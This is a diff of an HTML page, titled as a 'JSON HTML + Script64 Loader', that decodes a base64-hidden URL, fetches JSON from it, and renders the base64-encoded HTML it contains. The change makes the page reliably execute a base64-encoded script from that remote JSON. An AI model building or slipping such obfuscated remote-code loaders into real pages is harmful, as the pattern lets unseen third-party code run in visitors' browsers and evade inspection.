@@ -2,10 +2,10 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>JSON-Based HTML + Script Loader</title>
+  <title>JSON HTML + Script64 Loader</title>
 </head>
 <body>
-  <p>Loading remote JSON…</p>
+  <p>Loading content...</p>
 
   <script>
     (async () => {
@@ -14,7 +14,7 @@
         try {
           return atob(str.trim());
         } catch (e) {
-          console.error("Base64 decode failed:", e);
+          console.error("Base64 decode error:", e);
           return null;
         }
       };
@@ -28,38 +28,37 @@
       const targetUrl = decodeURIComponent(atob(encodedUrl));
 
       try {
-        const response = await fetch(targetUrl);
-        const json = await response.json();
+        const res = await fetch(targetUrl);
+        const json = await res.json();
 
         if (!json.html64) {
-          document.body.innerHTML = "<h2>Error: JSON missing 'html64'.</h2>";
+          document.body.innerHTML = "<h2>Error: JSON missing 'html64'</h2>";
           return;
         }
 
-        const decodedHTML = decodeBase64(json.html64);
-        if (!decodedHTML) {
-          document.body.innerHTML = "<h2>Error decoding html64.</h2>";
-          return;
-        }
+        const htmlDecoded = decodeBase64(json.html64);
+        const scriptDecoded = json.script64 ? json.script64.trim() : "";
 
-        // Replace page content
+        // Inject the HTML, and add inline JS that injects script64 into the new context
         document.open();
-        document.write(decodedHTML);
+        document.write(`
+          ${htmlDecoded}
+          <script>
+            (function(){
+              try {
+                const script = atob(${JSON.stringify(scriptDecoded)});
+                const s = document.createElement('script');
+                s.textContent = script;
+                document.body.appendChild(s);
+              } catch(e) {
+                console.error("Injected script64 error:", e);
+              }
+            })();
+          <\/script>
+        `);
         document.close();
-
-        // Inject script after DOM loads
-        window.addEventListener("DOMContentLoaded", () => {
-          if (json.script64) {
-            const decodedScript = decodeBase64(json.script64);
-            if (decodedScript) {
-              const script = document.createElement("script");
-              script.textContent = decodedScript;
-              document.body.appendChild(script);
-            }
-          }
-        });
       } catch (err) {
-        document.body.innerHTML = `<h2>Error loading or parsing JSON.</h2><pre>${err}</pre>`;
+        document.body.innerHTML = "<h2>Error loading JSON.</h2><pre>" + err + "</pre>";
         console.error(err);
       }
     })();
